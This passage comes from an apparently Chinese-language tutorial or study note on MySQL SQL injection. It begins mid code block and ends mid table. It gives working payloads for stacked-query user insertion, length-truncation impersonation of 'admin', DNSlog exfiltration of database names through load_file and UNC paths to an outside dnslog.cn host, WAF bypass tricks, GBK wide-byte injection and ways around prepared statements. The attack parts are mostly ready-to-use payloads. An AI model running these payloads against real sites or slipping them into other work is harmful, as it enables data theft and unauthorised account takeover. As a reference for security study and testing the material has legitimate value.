<span class="hljs-string">?id=-1'</span> union select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-title function_ invoke__">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns where table_name=<span class="hljs-string">'users'</span> --+

<span class="hljs-comment">//执行完上述语句，我们得知了列名，此时我们根据具体列名，进行sql查询，删除等语句的执行</span>

?id=-<span class="hljs-number">1</span><span class="hljs-string">' ;insert into users(id,username,password)values(115,'</span><span class="hljs-number">1234</span><span class="hljs-string">','</span><span class="hljs-number">4567</span><span class="hljs-string">');</span>
<span class="hljs-string">?id=-1'</span> ;insert into <span class="hljs-title function_ invoke__">users</span>(id,username,password)<span class="hljs-title function_ invoke__">values</span>(<span class="hljs-number">100</span>,<span class="hljs-string">'772211'</span>,<span class="hljs-string">'112277'</span>);

随后执行?id=<span class="hljs-number">56</span>，可以看到自己成功插入了密码用户名</code></pre>
<h4 id="426-小tip-mysql长字符截断">4.2.6 小tip: mysql长字符截断</h4>
<p>mysql中有一个环境变量配置sql_mode,定义了mysql应该支持的sql语法，数据校验等,可以通过以下方式查看当前数据库使用的sql_mode：</p>
<pre><code class="hljs plaintext">select @@sql_mode</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230316153129901.png" alt="image-20230316153129901"></p>
<p>具体的参数解释见参考资料5：<strong>MySQL的sql_mode模式</strong>，mysql5.0版本以上支持了三种sql_mode模式，如下：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230316153157978.png" alt="image-20230316153157978"></p>
<p>默认情况下，mysql选择使用的是严格模式，此时如果插入的数据超过限制长度，则会报错error(<strong>如果超出的长度是由空格引起的，可能只会警告warning，实际操作证明，三种模式下，如果插入的超出长度是由空格引起的，并不会报错，仅仅会警告，本节最后给出结果</strong>):</p>
<pre><code class="hljs php">describe users;
insert into users <span class="hljs-title function_ invoke__">values</span> (<span class="hljs-number">1</span>,<span class="hljs-string">'admin'</span>,<span class="hljs-string">'123'</span>);<span class="hljs-comment">#正常插入</span>
insert into users <span class="hljs-title function_ invoke__">values</span> (<span class="hljs-number">2</span>,<span class="hljs-string">'admin   '</span>,<span class="hljs-string">'123'</span>);
<span class="hljs-comment">#username限制7个字符，这里插入8个字符（后3个为空格，插入成功，出现警告），出现截断情况</span>
insert into users <span class="hljs-title function_ invoke__">values</span> (<span class="hljs-number">3</span>,<span class="hljs-string">'admin   x'</span>,<span class="hljs-string">'1234'</span>);<span class="hljs-comment">#报错，提醒超长字符</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230316153233245.png" alt="image-20230316153233245"></p>
<p>对于id=2的插入，可以查看其usernsme的长度,发现其长度为7:</p>
<pre><code class="hljs php">select <span class="hljs-title function_ invoke__">length</span>(username) <span class="hljs-keyword">from</span> users where id = <span class="hljs-number">2</span>;</code></pre>
<p>下面重点讨论当sql_mode模式为ANSI时引起的长字符截断问题：<br>
首先将sql_mode设置为ANSI模式：</p>
<pre><code class="hljs plaintext">SET @@sql_mode=ANSI;</code></pre>
<pre><code class="hljs plaintext">接下来依次创建table,插入数据，这里发现username='admin x’也插入成功了：</code></pre>
<pre><code class="hljs php">create table <span class="hljs-title function_ invoke__">users</span>(
    -&gt; id <span class="hljs-keyword">int</span>(<span class="hljs-number">11</span>) NOT <span class="hljs-literal">NULL</span>,
    -&gt; username <span class="hljs-title function_ invoke__">varchar</span>(<span class="hljs-number">7</span>) NOT <span class="hljs-literal">NULL</span>,
    -&gt; password <span class="hljs-title function_ invoke__">varchar</span>(<span class="hljs-number">12</span>) NOT <span class="hljs-literal">NULL</span>);<span class="hljs-comment">#创建users表格</span>
insert into users <span class="hljs-title function_ invoke__">values</span> (<span class="hljs-number">1</span>,<span class="hljs-string">'admin'</span>,<span class="hljs-number">123</span>);<span class="hljs-comment">#正常插入</span>
insert into users <span class="hljs-title function_ invoke__">values</span> (<span class="hljs-number">2</span>,<span class="hljs-string">'admin   '</span>,<span class="hljs-number">1234</span>);<span class="hljs-comment">#警告，插入成功</span>
insert into users <span class="hljs-title function_ invoke__">values</span> (<span class="hljs-number">3</span>,<span class="hljs-string">'admin  x'</span>,<span class="hljs-number">12345</span>);<span class="hljs-comment">#警告，插入成功</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230316153400825.png" alt="image-20230316153400825"></p>
<p>观察一下各个用户的长度，可以发现id=2,id=3的username均被截断，长度都变成了7：</p>
<pre><code class="hljs php">select *<span class="hljs-keyword">from</span> users;
select <span class="hljs-title function_ invoke__">length</span>(username) <span class="hljs-keyword">from</span> users where id =<span class="hljs-number">1</span>;
select <span class="hljs-title function_ invoke__">length</span>(username) <span class="hljs-keyword">from</span> users where id =<span class="hljs-number">2</span>;
select <span class="hljs-title function_ invoke__">length</span>(username) <span class="hljs-keyword">from</span> users where id =<span class="hljs-number">3</span>;</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230316153438727.png" alt="image-20230316153438727"></p>
<p>如果此时选择username= 'admin’会出现下面情况：</p>
<pre><code class="hljs plaintext">select username from users where username = 'admin';</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230316153508833.png" alt="image-20230316153508833"></p>
<p>此时，我们只查询了用户名为admin的用户，但另外两个长度不一致的用户却出现，这会造成安全问题。假如，某个管理员的用户名就是admin,他采用下面的语句登录：<br>
$sql = "select count ( * ) from users where username = ‘admin’ and password = ‘*****’ ";<br>
此时，我们只要伪造用户’admin x’便可以获得管理员的信息，从而进入后台。</p>
<p>补充： 对于三种模式下的空格插入溢出，并不会报错，结果如下：</p>
<pre><code class="hljs php">SET @@sql_mode=STRICT_TRANS_TABLES;
insert into users <span class="hljs-title function_ invoke__">values</span> (<span class="hljs-number">4</span>,<span class="hljs-string">'admin     '</span>,<span class="hljs-number">12345</span>);
insert into users <span class="hljs-title function_ invoke__">values</span> (<span class="hljs-number">5</span>,<span class="hljs-string">'admin     x'</span>,<span class="hljs-number">12345</span>);

SET @@sql_mode=TRADITIONAL;
insert into users <span class="hljs-title function_ invoke__">values</span> (<span class="hljs-number">6</span>,<span class="hljs-string">'admin     '</span>,<span class="hljs-number">123456</span>);
insert into users <span class="hljs-title function_ invoke__">values</span> (<span class="hljs-number">7</span>,<span class="hljs-string">'admin     x'</span>,<span class="hljs-number">123456</span>);</code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230316153606462.png" alt="image-20230316153606462"></p>
<p>由此可见，预防长字符截断问题可能需要从其他地方入手，如账号由管理员分配并限制更改；对数据库内容加密，即使获取到相关信息也无法破解。</p>
<p>假设管理员的账号就是admin，那么我们就去注册一个admin                                                                                                的用户.(PS:后面有哦很多空格，等待被截取掉就直接替换掉admin这个账号了)，也就是我们可以登录账户名为admin的账号了。</p>
<h3 id="43无回显">4.3无回显</h3>
<h4 id="431-dns-log">4.3.1 DNS Log</h4>
<p>我们在发起网络请求的时候，第一步就是解析域名，当域名被成功解析的时候，该域名解析结果将被域名服务器记录下来，我们利用的正是这一点，将我们想要的数据放在域名的下一级域中外带到域名服务器，通过查询域名服务器的日志，从而获得我们想要的数据，<a target="_blank" rel="noopener" href="http://xn--www-ot9d9z597bh9nd69a.dnslog.cn">如我们使用www.dnslog.cn</a> 这个网站来测试</p>
<p><strong>ping命令测试：</strong></p>
<p>点击获取子域名获取一个包含三级域名的域名给我们，这里我们使用ping命令做测试</p>
<pre><code class="hljs plaintext">ping %USERNAME%.4ap7wz.dnslog.cn</code></pre>
<p>当ping通的时候，我们点击该网站的刷新记录就可以看到我测试主机的用户名ChinaArmand了。该注入方法适用于需要时间盲注、没有回显的注入场景。构造mysql语句如下</p>
<pre><code class="hljs plaintext">?id=1' and (select load_file(concat('\\\\',(select database()),'.4ap7wz.dnslog.cn\\abc')))</code></pre>
<p>在到www.dnslog.cn看看是不是获取到了我们的数据库名,我们可以看到上面的语句使用了\，这是windowsUNC路径的表示方法，所以在SQLI中DNSLog只适用于windows平台的服务器 。<br>
unc路径，是在windows平台上访问局域网网络资源的一种路径表示方法，我们在window上使用的文件共享服务路径就是通过这种方式，\172.16.11.24 这也就解释了为什么只能在window平台的服务器上有效，另外多出来的两个\表示转义。</p>
<pre><code class="hljs plaintext">load_file 受mysql配置文件中secure_file_priv选项的限制，
 
secure_file_priv= //允许所有
secure_file_priv="G:\" //允许加载G盘
secure_file_priv=null //拒绝</code></pre>
<h5 id="dnslog-介绍">DNSlog 介绍</h5>
<pre><code class="hljs plaintext">首先我们知道DNS是起ip与域名的解析的服务，通过ip可以解析到对应的域名。DNSlog就是储存在DNS上的域名相关的信息，它记录着你对域名或者IP的访问信息，也就是类似于日志文件，</code></pre>
<h5 id="dnslog回显原理">DNSlog回显原理</h5>
<pre><code>首先了解一下多级域名的概念，我们知道因特网采用树状结构命名方法，按组织结构划分域是一个名字空间中一个被管理的划分，域可划分为子域，子域再可被划分为多级域名称为一级域名，二级域名，三级域名，从一个域名地址来从右到左依次是顶级域名，二级域名，三级域名,例如 gaobai.kxsy.com,
通俗的说就是我有个域名kxsy.work，我将域名设置对应的ip 2.2.2.2 上，这样当我向dns服务器发起kxsy.work的解析请求时，DNSlog中会记录下他给kxsy.work解析，解析值为2.2.2.2，而我们这个解析的记录的值就是我们要利用的地方,这个过程被记录下来就是DNSlog,
</code></pre>
<h5 id="dnslog-应用">DNSlog 应用</h5>
<p>1.sql布尔盲注、时间盲注，注入的效率低且线程高容易被waf拦截，又或者是目标站点没有回显可利用NDSlog<br>
2.无回显的命令执行<br>
推荐三个大众化的免费dns解析记录网站</p>
<pre><code>http://www.dnslog.cn
http://admin.dnslog.link
http://ceye.io
</code></pre>
<h5 id="dnslog回显注入条件">DNSlog回显注入条件</h5>
<p>1.数据库root权限，<br>
2.数据库可读写权限，secure_file_priv值为空，上期笔记有说明，<br>
3.windows系统，</p>
<h5 id="dnslog-sql注入">DNSlog-sql注入</h5>
<p>1.注册一个dns解析服务，利用唯一标识符，以无回显sql注入为例</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230316194435563.png" alt="image-20230316194435563"></p>
<p>2.注入测试 需要闭合语句 替换标识符 利用盲注回显</p>
<pre><code class="hljs php">?id=<span class="hljs-number">1</span><span class="hljs-string">' and if((select load_file(concat('</span>\\\\<span class="hljs-string">',(select database()),'</span>.tlyypi.dnslog.cn\\abc<span class="hljs-string">'))),1,0)--+</span></code></pre>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230316194518087.png" alt="image-20230316194518087"></p>
<p>在回显数据时，域名能够接受的字符是有条件限制的，某些不适合作为域名的特殊字符可能会被屏蔽掉，针对这种情况我们也可以base64编码后再进行请求。</p>
<h2 id="0x05-sqli防御及绕过">0x05 SQLI防御及绕过</h2>
<pre><code class="hljs plaintext">WAF产生的背景：
传统防火墙 （ firewall ） 阻断数据包工作网络层Web服务器功能丰富成为攻击目标 （应用层）waf由此而生WAF（web application rewall）称为web应用防火墙，他是通过执行一系列针对HTTP，HTTPS的安全策略，来专门对web应用提供保护的一款产品。WAF是基于规则的防护，可以提供各种web应用的安全规则，waf生产商去维护这个规则库，并实时为其更新，用户按照这些规则，可以对应用进行全方面的保护

架构层绕过waf        
用户本身是进入waf后访问web页面的，只要我们找到web的真实IP，绕过waf就不在话下了在同网段内，页面与页面之间，服务器与服务器之间，通过waf的保护，然后展示给我们，只要我们在内部服务之间进行访问，即可绕过waf边界漏洞，同样类似于同网段数据，我们可以利用已知服务器存在的ssrf漏洞，将数据直接发送给同网段的web2进行SQL注入

资源限制角度绕waf  
由于数据太大，会导致waf无法将所有的数据都检测完，这个时候会忽略掉我们代入的sql注入语句，从而绕过waf，即：使用POST请求，对服务器请求很大资源数据,逃逸sql注入语句。

协议层面绕过
基于协议层，有的waf只过滤GET请求，而对POST请求没做别的限制，因此，可以将GET型换为POST型文件格式，页面仅对Content-Type为application/x-www-form-urlencoded数据格式进行过滤，因此我们只要将Content-Type格式修改为multipart/form-data，即可绕过waf参数污染：有的waf仅对部分内容进行过滤，例如：index.php？id=1&amp;id=2&amp;id=3这样的参数id=1，waf也仅对前部分的id=1进行检测，而后面的参数并不做处理。这样我们就可以在id=2的后面写入sql注入语句进行sql注入

规则层面绕waf
等价函数 :  
    hex()、bin() ==&gt; ascii()         
    sleep() &gt;benchmark()         
    concat_ws()&gt;group_concat()        
    mid()、substr() ==&gt; substring() 
    @@version ==&gt; version()
    
等价符号 :
and和or不能使用可以尝试下&amp;&amp;和||，还有=不能使用的情况可以考虑尝试&lt;、&gt;因为如果不小于又不大于那便是等于。逻辑异或xor,like(可以)特殊符号:使用反引号`，例如select `version()`，可以用来过空格和正则，特殊情况下还可以将其做注释符用, group by 9(可以)

缓冲区溢出：
and(select 1)=(Select 0xA*1000) uNiOn SeLeCt 1,2,version()　--+

asp允许每个字符前面添加一个%号SELECT FIELD FROM TABLE ààà %S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</code></pre>
<h3 id="51-嵌套及大小写混淆绕过">5.1 嵌套及大小写混淆绕过</h3>
<p>如果后台存在这样的语句</p>
<pre><code class="hljs php"><span class="hljs-variable">$arg</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">'union'</span>,<span class="hljs-string">''</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'id'</span>]) <span class="hljs-comment">//将union替换为空</span>

或者

<span class="hljs-variable">$arg</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">'/union/i'</span>,<span class="hljs-string">''</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'id'</span>]) <span class="hljs-comment">//将union替换为空，且不区分大小写</span></code></pre>
<p>我们可以这样构造payload</p>
<pre><code class="hljs php">?id=<span class="hljs-number">1</span><span class="hljs-string">' ununionion select 1,2,3%23 //上面两种用法均可这样绕过</span>
<span class="hljs-string"></span>
<span class="hljs-string">str_replace函数时不区分大小写的我们还可以通过UNion来绕过</span>
<span class="hljs-string"></span>
<span class="hljs-string">?id=1'</span> UNion select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span> --+</code></pre>
<h3 id="52-空格被过滤的绕过">5.2 空格被过滤的绕过</h3>
<p>通过内内联注释<br>
部分程序过滤了空格，将输入限制为单个，则可以通过内联注释绕过 还可通过%a0 ,%09,%0a,%0b,%0c,%0d绕过</p>
<pre><code class="hljs php">?id=<span class="hljs-number">1</span><span class="hljs-string">' /**/union/**/order/**/by/**/2 %23</span>
<span class="hljs-string">//这里/* */中间部分的符号因题而异，可能会有字符的过滤，需要一个一个尝试，或者bp爆破</span></code></pre>
<p>通过括号–emmmmm基本没啥用，就当作SQL语句的拓展吧（倒是可以跟报错注入利用，毕竟报错注入需要的空格少）<br>
通过括号代替空格有点鸡肋，关键字是不能被括起来的，否则会报错，比如order by 3不能写作`(order)(by)(3)基本没啥用。</p>
<h3 id="53-逗号被过滤的绕过">5.3 逗号被过滤的绕过</h3>
<pre><code class="hljs php">select <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">database</span>() <span class="hljs-keyword">from</span> <span class="hljs-number">1</span> to <span class="hljs-number">1</span>);

select <span class="hljs-title function_ invoke__">mid</span>(<span class="hljs-title function_ invoke__">database</span>() <span class="hljs-keyword">from</span> <span class="hljs-number">1</span> to <span class="hljs-number">1</span>);</code></pre>
<p>作用也不大，用到逗号的地方很多，如要查两个字段union select username,passwd这里的逗号就不能这样写，当然我们可以每次只查一个字段。</p>
<h3 id="54-空字节绕过也就是00截断">5.4 空字节绕过（也就是%00截断）</h3>
<p>用于绕过一些入侵检测系统，如ids ips等，这些检测系统一般都是用原生语言编写的，而这些语言检验字符串的结尾是通过检测空字节，在被检测系统检测的字符前面加上一个空字节就可以欺骗检测系统忽略被检测字符。%00-空字节</p>
<h3 id="55-编码绕过">5.5 编码绕过</h3>
<p>我们可以通过编码的方式欺骗后端的过滤机制</p>
<pre><code class="hljs php"><span class="hljs-number">1</span>. char       <span class="hljs-title function_ invoke__">select</span>(<span class="hljs-title function_ invoke__">char</span>(<span class="hljs-number">67</span>,<span class="hljs-number">58</span>,<span class="hljs-number">45</span>,<span class="hljs-number">56</span>,<span class="hljs-number">67</span>,<span class="hljs-number">45</span>,<span class="hljs-number">35</span>,<span class="hljs-number">44</span>,<span class="hljs-number">3</span>));
<span class="hljs-number">2</span>. <span class="hljs-number">16</span>进制编码    <span class="hljs-number">0x234532e34f2a34b</span>
<span class="hljs-number">3</span>. hex
<span class="hljs-number">4</span>. unhex   select <span class="hljs-title function_ invoke__">convert</span>(<span class="hljs-title function_ invoke__">unhex</span>(<span class="hljs-string">'e3f23a44b445'</span>)using utf8)
<span class="hljs-number">5</span>. <span class="hljs-title function_ invoke__">to_base64</span>(),<span class="hljs-title function_ invoke__">from_base64</span>()</code></pre>
<h3 id="56-引号被转义">5.6 引号被转义</h3>
<h5 id="背景知识">背景知识:</h5>
<pre><code class="hljs plaintext">字符集

在了解宽字节注入之前，我们先来看一看字符集是什么。字符集也叫字符编码，是一种将符号转换为二进制数的映射关系。
几种常见的字符集：

    ASCII编码：单字节编码
    latin1编码：单字节编码
    gbk编码：使用一字节和双字节编码，0x00-0x7F范围内是一位，和 ASCII 保持一致。双字节的第一字节范围是0x81-0xFE
    UTF-8编码：使用一至四字节编码，0x00–0x7F范围内是一位，和 ASCII 保持一致。其它字符用二至四个字节变长表示。

宽字节就是两个以上的字节，宽字节注入产生的原因就是各种字符编码的不当操作，使得攻击者可以通过宽字节编码绕过SQL注入防御。</code></pre>
<pre><code class="hljs plaintext">    GBK编码，是在GB2312-80标准基础上的内码扩展规范，使用了双字节编码方案，其编码范围从8140至FEFE（剔除xx7F），共23940个码位，共收录了21003个汉字，完全兼容GB2312-80标准，支持国际标准ISO/IEC10646-1和国家标准GB13000-1中的全部中日韩汉字，并包含了BIG5编码中的所有汉字——（摘自百度百科）。

字符反斜线“\” 的ASCII码值是5C，占用一个字节，GBK编码方式可以将反斜线“\”转换为一个服务器数据库不识别的汉字，即在5C前面拼接组合一个字符0xdf，那么数据库就会将0xdf5c转换为一个不识别的汉字，这样数据库就会将其忽略掉。

宽字节注⼊源于程序员设置MySQL连接时错误配置为：set character_set_client=gbk，这样配置会引发编码转换从⽽导致的注⼊漏洞。
具体原理如下：1，正常情况下当GPC开启或使⽤addslashes函数过滤GET或POST提交的参数时，⿊客使⽤的单引号'就会被转义为: '；2，但如果存在宽字节注⼊，我们输⼊%df%27时⾸先经过上⾯提到的单引号转义变成了%df%5c%27（%5c是反斜杠），之后在数据库查询前由于使⽤了GBK多字节编码，即在汉字编码范围内两个字节会被编码为⼀个汉字。然后MySQL服务器会对查询语句进⾏GBK编码即%df%5c转换成了汉字“運”，⽽单引号逃逸了出来，从⽽造成了注⼊漏洞。

GBK编码导致宽字节注⼊
GBK编码是数据库编码，跟前台的编码⽆关GBK转UTF-8
原理其实跟前⾯⾥原理⾥说的第2条是⼀样的，我们输⼊%df%27时⾸先经过上⾯提到的单引号转义变成了%df%5c%27（%5c是反斜杠），然后%df%5c正好属于gbk的汉字编码范围，经过iconv转换到utf-8编码转换后变成了汉字“運”，从⽽吞掉了反斜杠使得单引号逃脱出来。UTF-8转GBK
这⾥我们思考下“錦”这个字，它的utf-8编码是e98ca6，它的gbk编码是%e5%5c，⽽上⾯提到过反斜杠\正好为%5c。所以如果我们将title设置为：錦’，⾸先经过addlashes函数或GPC对单引号转义变为：錦’，然后会经过icnov函数会对”錦”转化为gbk编码，最后就是：％e5％5c％5c％27。反斜杠被转义了（％5c％5c），从⽽单引号逃逸出来就会引发注⼊漏洞。</code></pre>
<p>假设当前数据库使用GBK编码集，数据库会将输入的参数%df%5c解析为两个字节：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230520182630877.png" alt="image-20230520182630877"></p>
<p>​		其中%df为高位字节，编码位是223；%5c为低位字节，编码位是92；%df%5c的GBK编码取值范围就是：第一个字节是129—254，第二个字节是64—254，数据库会按照GBK编码将%df%5c解析成一个汉字，这样“\”就会失去原来的作用。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230520182708586.png" alt="image-20230520182708586"></p>
<p><strong>在上图中，数据库将参数%df%5c按照GBK编码集解析成上图中的汉字：運，这种方式就是宽字节注入。</strong></p>
<p><strong>宽字节注入有前提：要求目标MYSQL数据库的编码方式是GBK编码，并且客户端必须和数据库的编码方式一致，这样才能使用宽字节注入方式，宽字节注入过程如下所示：</strong></p>
<p>为了突破这个防护，我们可以使用宽字节注入的方式来进行突破，使用：</p>
<pre><code class="hljs plaintext">%df ’</code></pre>
<p>当我们在单引号之前加上%df的时候，也就是输入%df ’ 这样传入到数据库中就会变成：</p>
<pre><code class="hljs plaintext">%df%5c ’</code></pre>
<p>原理是在GBK编码中，%df与 \ 的<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E8%BD%AC%E4%B9%89%E7%AC%A6&amp;spm=1001.2101.3001.7020">转义符</a>%5c结合会编码成一个汉字，这样就使得 ’ 逃逸了。此外 <code>%DE%5C</code>,<code>%E0%5C</code>也都是可以的。</p>
<p><strong>eg：</strong></p>
<p>传入1’时，返回结果出现1’ ',此处是不存在sql注入漏洞的，但是有一个特例，就是当数据库编码为GBK时可以使用宽字节注入，宽字节的格式是在地址后加一个%df，再加单引号，因为反斜杠的编码为%5c，而再GBK编码中%df%5c为一个繁体字，此时查询就会出错，一般结合Union注入使用。</p>
<pre><code>1%df' union select 1,2,3 %23查看输出位置
</code></pre>
<p>查询表名时，一般使用语句</p>
<pre><code>1%df' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() %23 
</code></pre>
<p>查询列名的时候会有所不同，因为对单引号进行了过滤</p>
<pre><code class="hljs php">select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-title function_ invoke__">group_concat</span>(column_name) <span class="hljs-keyword">from</span> information_schema.columns where table_schema=<span class="hljs-title function_ invoke__">database</span>() <span class="hljs-keyword">and</span> table_name=(select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-title function_ invoke__">group_concat</span>(table_name) <span class="hljs-keyword">from</span> information_schema.tables where table_schema=<span class="hljs-title function_ invoke__">database</span>()) %<span class="hljs-number">23</span></code></pre>
<p>还有一些例如cookie注入，base64注入，和XFF注入，类型相似，不一一讲解了</p>
<pre><code class="hljs php"><span class="hljs-keyword">and</span> ⇒ &amp;&amp;
<span class="hljs-keyword">or</span> =&gt; ||
&lt; &gt; = =&gt; <span class="hljs-title function_ invoke__">between</span>() ,like 
limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>  =&gt; limit <span class="hljs-number">0</span> offset <span class="hljs-number">1</span>
substr =&gt; substring mid left right
sleep =&gt; benchmark</code></pre>
<h3 id="57-http参数污染">5.7 HTTP参数污染</h3>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="image-20230316211524090.png" alt="image-20230316211524090"></p>
<p>客户端在访问服务器端时，需要先经过一个tomcat服务器，这个tomcat服务器中部署的过滤代码充当了waf的功能。输入的参数经过tomcat服务器过滤后，再被传入到真正的服务端apache服务器上处理，然后逐层返回到客户端。</p>
<pre><code>  这里传入的参数只有一个，名为id，当我们强行传入两个名都为id的参数时，waf获取的是第一个参数，而忽略第二个参数，则对第二个参数的内容不做任何检查和过滤，这样第二个参数就可以传入到apache服务器端，进行解析。
</code></pre>
<p><strong>我们在url后面输入login.php进入到受waf保护的界面</strong></p>
<pre><code class="hljs php">?id=<span class="hljs-number">0</span>&amp;id=-<span class="hljs-number">1</span><span class="hljs-string">' union select 1,2,database() --+</span></code></pre>
<h3 id="58-预编译绕过">5.8 预编译绕过</h3>
<h4 id="581-简介">5.8.1 简介</h4>
<p>SQL注入是因为解释器将传入的数据当成命令执行而导致的，预编译是用于解决这个问题的一种方法。和普通的执行流程不同，预编译将一次查询通过两次交互完成，第一次交互发送查询语句的模板，由后端的SQL引擎进行解析为AST或Opcode，第二次交互发送数据，代入AST或Opcode中执行。因为此时语法解析已经完成，所以不会再出现混淆数据和代码的过程。</p>
<h4 id="582-模拟预编译">5.8.2 模拟预编译</h4>
<p>为了防止低版本数据库不支持预编译的情况，模拟预编译会在客户端内部模拟参数绑定的过程，进行自定义的转义。</p>
<h4 id="583-绕过">5.8.3 绕过</h4>
<h5 id="5831-预编译使用错误">5.8.3.1 预编译使用错误</h5>
<p>预编译只是使用占位符替代的字段值的部分，如果第一次交互传入的命令使用了字符串拼接，使得命令是攻击者可控的，那么预编译不会生效。</p>
<h5 id="5832-部分参数不可预编译">5.8.3.2 部分参数不可预编译</h5>
<p>在有的情况下，数据库处理引擎会检查数据表和数据列是否存在，因此数据表名和列名不能被占位符所替代。这种情况下如果表名和列名可控，则可能引入漏洞。</p>
<h5 id="5833-预编译实现错误">5.8.3.3 预编译实现错误</h5>
<p>部分语言引擎在实现上存在一定问题，可能会存在绕过漏洞。</p>
<h3 id="59-绕过or和and的">5.9 绕过or和and的</h3>
<pre><code class="hljs plaintext">1、大小写变形：将原本的 or 和 and 替换为：Or、oR、And、AND、aND、aNd等等。

2、转换编码输入：将 or 和 and 使用hex，urlencode等编码方式进行转换后在输入。

3、添加注释（内联注释）：例如：/*or*/，中间的语句会被mysql中解析（一般其他数据库不会）
注释符如下:
	#
	--+
	/*xxx*/
	/*!xxx*/
	/*!50000xxx*/

4、双写绕过：例如：oorr，aandnd 等。

5、可以使用%26%26代替and。%26 代表字符 '&amp;' 。有时候&amp;&amp;不能用但是可以使用%26%26反正就这两个轮换着试验，哪个可行用哪个。

6、利用符号：and替换为&amp;&amp;、or替换为||</code></pre>
<h3 id="510-绕过空格和注释符">5.10 绕过空格和注释符</h3>
<pre><code class="hljs plaintext">绕过注释符方法：使用 or '1'='1 或者 and '1'='1 替换，这里理解一下注释符号的作用就可以，我们只要把后面的符号想办法闭合就可以，单引号可以随时替换，主要是根据sql语句的闭合方式决定使用什么符号闭合。

        绕过空格方法：

        1、/**/（注释绕过）
        2、%09 Tab键（水平）
        3、%0a 新建一行
        4、%0c 新的一页
        5、%0d return 键
        6、%0b Tab键（垂直）
        7、%a0 空格
        8、() 绕过，主要通过括号去将某些语句独立起来，这样就不需要空格了。


        以上都可以用来绕过。一般过滤了空格之后，联合注入以及双查询注入等就不推荐使用了（Windows系统的前提，如果是LINUX系统直接使用等价字符绕过空格就可以），最好使用报错注入中的 extractvalue()函数 以及 updatexml()函数 进行报错注入。</code></pre>
<h2 id="0x06-mysql常见函数">0x06 Mysql常见函数</h2>
<table>
<thead>
<tr>
<th>=、&gt;、&gt;=、&lt;= 、&lt;&gt;</th>
<th>比较运算符</th>
</tr>
</thead>
<tbody>
<tr>
<td>and、or</td>
<td>逻辑运算符</td>
</tr>
<tr>
<td>version( )</td>
<td>mysql数据库版本</td>
</tr>
<tr>
<td>database( )</td>
<td>当前数据库名</td>
</tr>
<tr>
<td>sleep( )</td>
<td>睡眠时间为指定的秒数</td>
</tr>
<tr>
<td>if(true,t,f)</td>
<td>if判断</td>
</tr>
<tr>
<td>length( )</td>
<td>返回字符串的长度</td>
</tr>
<tr>
<td>substring( )</td>
<td>截取字符串三个函数作用相同有三个参数 mid(“1”,2,3)1.截取的字符串2.截取起始位置，从1开始计数3.截取长度</td>
</tr>
<tr>
<td>substr( )</td>
<td>截取字符串三个函数作用相同有三个参数 mid(“1”,2,3)1.截取的字符串2.截取起始位置，从1开始计数3.截取长度</td>
</tr>
<tr>
<td>mid( )</td>
<td>截取字符串三个函数作用相同有三个参数 mid(“1”,2,3)1.截取的字符串2.截取起始位置，从1开始计数3.截取长度</td>
</tr>
<tr>
<td>left( )</td>
<td>从左侧开始取指定字符个数的字符串</td>
</tr>
<tr>
